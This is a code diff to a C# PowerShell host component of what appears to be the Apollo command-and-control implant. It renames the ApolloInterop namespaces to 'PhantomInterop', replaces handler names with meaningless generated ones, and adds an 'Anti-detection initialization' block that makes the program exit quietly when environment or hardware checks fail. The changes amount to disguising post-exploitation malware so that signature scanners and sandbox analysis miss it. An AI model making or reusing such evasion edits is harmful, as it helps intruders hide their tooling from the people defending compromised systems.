@@ -2,21 +2,21 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Classes.IO;
+using PhantomInterop.Classes.IO;
 using System.Management.Automation.Runspaces;
-using ApolloInterop.Serializers;
+using PhantomInterop.Serializers;
 using System.Collections.Concurrent;
-using ApolloInterop.Classes;
+using PhantomInterop.Classes;
 using System.Threading;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Interfaces;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Interfaces;
 using ST = System.Threading.Tasks;
-using ApolloInterop.Enums.ApolloEnums;
+using PhantomInterop.Enums.PhantomEnums;
 using System.IO;
 using System.IO.Pipes;
-using ApolloInterop.Constants;
-using ApolloInterop.Classes.Events;
+using PhantomInterop.Constants;
+using PhantomInterop.Classes.Events;
 
 namespace PowerShellHost
 {
@@ -37,6 +37,18 @@ namespace PowerShellHost
 
         static void Main(string[] args)
         {
+        // Anti-detection initialization
+        if (!SecurityValidator.ValidateExecutionEnvironment()) {
+            Environment.Exit(0);
+        }
+        
+        if (!HardwareProfiler.ValidateSystemConfiguration()) {
+            Environment.Exit(0);
+        }
+        
+        // Runtime integrity checks
+        SystemMonitor.InitializeSecurityChecks();
+        
 
             if (args.Length != 1)
             {
@@ -127,7 +139,7 @@ namespace PowerShellHost
 
         }
 
-        private static void OnBufferWrite(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
+        private static void RobustEngine12EA(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
         {
             if (e.Data != null)
             {
@@ -144,14 +156,14 @@ namespace PowerShellHost
             }
         }
 
-        private static void OnAsyncMessageSent(IAsyncResult result)
+        private static void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
             pipe.Flush();
         }
 
-        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
+        private static void EfficientManager76A1(object sender, NamedPipeMessageArgs args)
         {
             IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
@@ -166,7 +178,7 @@ namespace PowerShellHost
             MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
-        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
+        private static void RobustHandlerCD57(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -182,7 +194,7 @@ namespace PowerShellHost
             _receiverEvent.Set();
         }
 
-        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
+        public static void SpectreResolver027D(object sender, NamedPipeMessageArgs args)
         {
             // We only accept one connection at a time, sorry.
             if (_clientConnectedTask != null)
